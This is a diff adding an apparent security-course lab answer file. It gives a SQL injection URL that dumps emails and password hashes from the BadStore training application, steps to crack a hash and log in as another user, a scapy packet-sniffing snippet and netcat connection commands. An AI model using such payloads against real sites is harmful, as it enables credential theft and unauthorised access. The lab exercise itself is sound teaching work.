@@ -1,0 +1,20 @@
+2a)
+- Get Joe's password via SQL injection
+- URL : http://192.168.56.101/cgi-bin/badstore.cgi?searchquery=xx'+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,123,123+from+userdb+LIMIT+10+--+&action=search&x=16&y=7
+- Get hash and md5 reverse the hash
+- Login as joe
+- http://192.168.56.101/cgi-bin/badstore.cgi?action=viewprevious
+
+2b)
+from scapy.all import * 
+packets=sniff(count=10) 
+packets.summary() 
+print(packets[0].show()) 
+print(packets[1].show())
+
+2c)
+- Terminal 1 : nc -lvp 1234
+- Terminal 2 : nc 127.0.0.1 1234
+Across systems - 
+- Terminal 1 : nc -lvp 1234
+- Terminal 2 : nc <ip-of-pc1> 1234
